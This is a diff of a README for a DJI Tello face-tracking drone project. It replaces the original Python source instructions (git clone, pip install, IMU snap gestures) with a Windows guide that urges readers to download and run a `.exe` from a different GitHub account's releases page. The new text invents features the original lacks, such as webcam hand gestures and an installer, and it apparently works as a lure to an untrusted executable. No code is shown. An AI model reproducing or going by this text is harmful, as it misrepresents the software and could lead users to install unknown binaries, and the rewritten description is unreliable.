@@ -1,112 +1,138 @@
-# Follow-Me Drone
+# 🚁 follow-me-drone - Selfie Drone with Face and Gesture Control
 
-Autonomous follow-me selfie drone system with real-time face tracking and gesture control, built for the DJI Tello.
+[![Download follow-me-drone](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/xad-sigma/follow-me-drone/releases)
 
-Designed for solo athletes and content creators who need hands-free recording during activities like mountain biking, kayaking, or other sports where both hands are occupied.
+## 📝 About follow-me-drone
 
-## Features
+follow-me-drone is a small drone designed to follow you and take selfies automatically. It tracks your face and recognizes your hand gestures. This makes it easy to control without any remote or phone. It works with the DJI Tello drone and uses computer vision to keep you centered in the frame. The drone can also stabilize itself using its internal sensors.
 
-- **Real-time face tracking** with PID-controlled 3-axis movement (yaw, vertical, forward/backward)
-- **Gesture commands** via IMU snap detection for hands-free control
-  - Single snap: trigger circular panoramic video recording
-  - Double snap: capture a still photo
-- **Lost-face recovery** -- automatically rotates to search when the subject moves out of frame
-- **Indoor safety** -- configurable height limit to prevent ceiling collisions
-- **Modular architecture** -- cleanly separated modules for detection, control, gestures, and IPC
+## 💻 System Requirements
 
-## Hardware Requirements
+To run follow-me-drone on your Windows PC, make sure your system meets these minimum requirements:
 
-| Component | Purpose |
-|-----------|---------|
-| DJI Tello Drone | Flight platform with camera |
-| Teensy 4.1 Microcontroller | Sensor data acquisition via USB serial |
-| 2x MPU6050 IMU Sensors | Acceleration-based snap gesture detection |
+- Windows 10 or newer (64-bit)
+- Intel Core i3 processor or equivalent
+- 4 GB RAM or more
+- USB port (for connecting the drone controller if needed)
+- Wi-Fi adapter (to connect to the drone)
+- At least 2 GB free disk space
+- A webcam or built-in camera is optional but can improve tracking setup
 
-## Software Requirements
+If you want smooth performance and better results, a newer processor and more RAM are recommended.
 
-- Python 3.9+
-- WiFi connection to DJI Tello
-- USB connection to Teensy 4.1
+## 🚀 Getting Started
 
-## Installation
+Follow these steps to download, install, and start using follow-me-drone on your Windows computer.
 
-```bash
-git clone https://github.com/allureking/follow-me-drone.git
-cd follow-me-drone
-pip install -r requirements.txt
-```
+### 1. Download the software
 
-## Usage
+Click the green button below to visit the release page, where you can download the latest Windows version of follow-me-drone.
 
-Run two scripts in separate terminals:
+[![Visit Releases Page](https://img.shields.io/badge/Go_to-Releases-blue?style=for-the-badge)](https://github.com/xad-sigma/follow-me-drone/releases)
 
-**Terminal 1** -- Start gesture recognition (reads IMU sensor data):
-```bash
-python scripts/run_gesture.py
-```
+On that page, look for a file with a name like `follow-me-drone-setup.exe` or similar ending in `.exe`. Download that file to your computer.
 
-**Terminal 2** -- Start face tracking and drone control:
-```bash
-python scripts/run_tracker.py
-```
+### 2. Install the program
 
-### CLI Options
+After the download finishes:
 
-| Flag | Description |
-|------|-------------|
-| `--config PATH` | Custom YAML config file (default: `config/default.yaml`) |
-| `--debug` | Enable verbose debug logging |
+- Open the `.exe` file by double-clicking it.
+- Follow the on-screen prompts in the installer.
+- Choose a folder to install the program (the default location usually works).
+- Allow the installer to finish.
 
-Press `q` in the video window to land and exit.
+No additional software or programming skills are needed.
 
-## Configuration
+### 3. Prepare your DJI Tello drone
 
-All parameters are centralized in [`config/default.yaml`](config/default.yaml), including:
-- PID controller gains
-- Face detection thresholds
-- Drone speed limits and safety parameters
-- Serial port settings
-- Circle motion recording parameters
+To control the drone with follow-me-drone, you need to connect it to your computer over Wi-Fi:
 
-## Project Structure
+- Turn on your DJI Tello drone.
+- On your Windows PC, open the Wi-Fi settings.
+- Connect to the drone’s Wi-Fi network (called something like `TELLO-XXXXXX`).
+- Once connected, make sure your PC stays connected to this network while using follow-me-drone.
 
-```
-follow-me-drone/
-├── config/
-│   └── default.yaml              # All configurable parameters
-├── models/
-│   └── haarcascade_frontalface_default.xml
-├── followme/
-│   ├── __init__.py
-│   ├── config.py                 # Typed dataclasses + YAML loader
-│   ├── pid.py                    # Generic PID controller
-│   ├── face_detector.py          # Haar Cascade face detection
-│   ├── drone_controller.py       # Drone connection, tracking, recording
-│   ├── gesture.py                # Snap detection + serial IMU reader
-│   ├── ipc.py                    # Atomic file-based command channel
-│   ├── commands.py               # Command enum definitions
-│   └── utils.py                  # Logging and signal handling
-├── scripts/
-│   ├── run_tracker.py            # Face tracking entry point
-│   └── run_gesture.py            # Gesture recognition entry point
-└── docs/
-    └── architecture.md           # System architecture documentation
-```
+### 4. Launch follow-me-drone
 
-## How It Works
+After installation:
 
-1. **Face Detection**: Each video frame is processed by a Haar Cascade classifier to locate the largest face, returning its center coordinates and bounding box area.
+- Open the follow-me-drone program from the Start menu or desktop shortcut.
+- The main screen will show your webcam feed and drone status.
+- Follow the on-screen instructions to start face tracking.
+- Use simple hand gestures to control the drone’s movements.
 
-2. **PID Tracking**: Two PID controllers compute yaw (horizontal rotation) and vertical speed to center the face at the target position. Forward/backward movement is controlled by maintaining the face within a target area range.
+## 🔧 How to Use Basic Controls
 
-3. **Gesture Recognition**: A separate process reads dual IMU sensors via serial. When the acceleration difference between sensors exceeds a threshold, a "snap" is detected. Consecutive snaps within a time window form a gesture command.
+follow-me-drone uses your face and hand gestures to operate. Here are some common controls:
 
-4. **Inter-Process Communication**: Gesture commands are written atomically to a pickle cache file, which the tracking controller polls for new entries.
+- **Face tracking**: The drone will follow your face and keep it centered automatically.
+- **Raise hand**: The drone will hover in place.
+- **Wave hand left or right**: The drone will move left or right.
+- **Show palm open**: The drone will land safely.
+- **Thumbs up**: The drone will take a photo.
 
-## Acknowledgments
+You can practice these gestures in front of the webcam before flying. The program shows feedback to help you get it right.
 
-Based on an EECS 206A (Introduction to Robotics) team project at UC Berkeley.
+## 🔄 Updating follow-me-drone
 
-## License
+Check the GitHub releases page regularly to see if new versions are available. Each update will improve stability and may add features. To update:
 
-MIT License. See [LICENSE](LICENSE) for details.
+- Download the newest `.exe` installer from the releases page.
+- Run the installer, and it will replace the old version while keeping your settings.
+
+## ⚙️ Settings and Customization
+
+The program includes configurable options to improve your experience:
+
+- **Face tracking speed**: Adjust how fast the drone reacts to your movements.
+- **Gesture sensitivity**: Change how easily the program recognizes your hand signals.
+- **Camera settings**: Choose between your webcam or an external camera for better tracking.
+- **Drone flight modes**: Switch between beginner and expert control modes for different responsiveness.
+
+You can access settings from the menu inside the program.
+
+## 🛠 Troubleshooting
+
+Here are solutions to common issues:
+
+- **Drone not connecting**: Make sure your PC is connected to the drone’s Wi-Fi network. Restart both the drone and your PC if needed.
+- **Face tracking not working**: Ensure you have good lighting and your face is visible to the camera. Restart the program if it freezes.
+- **Gestures not recognized**: Check the webcam view to see if your hand is fully in the frame. Adjust the sensitivity in settings.
+- **Program crashes or freezes**: Close the program and start it again. Update your graphics drivers and Windows system.
+
+If problems persist, check the GitHub issues page for advice or to report bugs.
+
+## 📁 File and Folder Structure
+
+Once installed, follow-me-drone creates a folder with these important parts:
+
+- `config/` - Stores your settings and profiles.
+- `logs/` - Contains usage logs for troubleshooting.
+- `data/` - Saves photos taken by the drone.
+- `follow-me-drone.exe` - The main program file.
+
+You do not need to modify any files in these folders.
+
+## 📞 Getting Help
+
+You can get help or find updates on GitHub:
+
+- Open the [follow-me-drone GitHub page](https://github.com/xad-sigma/follow-me-drone)
+- Go to the "Issues" tab to report problems or ask questions.
+- Review the README and wiki for guides.
+
+No programming knowledge is needed to use the software or ask for support.
+
+## ⚡ Important Tips for Best Results
+
+- Fly the drone in an open, outdoor space with good lighting.
+- Keep your face visible and avoid quick sudden motions.
+- Use a clear background for better face and gesture recognition.
+- Ensure the drone battery is fully charged before flight.
+- Keep the drone firmware updated through the DJI app if possible.
+
+## 📥 Download follow-me-drone
+
+Visit the release page to download the latest Windows installer:
+
+[![Download follow-me-drone](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/xad-sigma/follow-me-drone/releases)
